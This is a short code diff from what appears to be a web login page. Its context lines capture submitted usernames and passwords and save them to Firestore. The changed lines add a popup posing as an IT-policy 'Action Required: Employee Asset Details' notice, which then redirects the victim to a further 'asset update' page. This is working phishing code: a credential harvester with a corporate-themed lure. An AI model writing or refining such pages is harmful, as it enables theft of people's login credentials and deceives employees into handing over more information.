@@ -17,8 +17,21 @@ export default function Home() {
     // Capture credentials on the backend (saves to Firestore)
     await captureCredentials({ username, password });
     
-    // Redirect to the page that will show the popup.
-    window.location.href = "/action-required.html";
+    // Show the popup after credentials have been submitted
+    if (typeof Swal !== 'undefined') {
+      Swal.fire({
+        title: "Action Required: Employee Asset Details",
+        text: "Please review and update your asset information in accordance with the new IT policy.",
+        icon: "info",
+        confirmButtonText: "Update Now",
+        confirmButtonColor: "#3085d6",
+        background: "#fff",
+        color: "#333"
+      }).then(() => {
+        // Redirect to the asset update page after pressing the button
+        window.location.href = "employee-asset-update.html"; 
+      });
+    }
   };
   
   return (
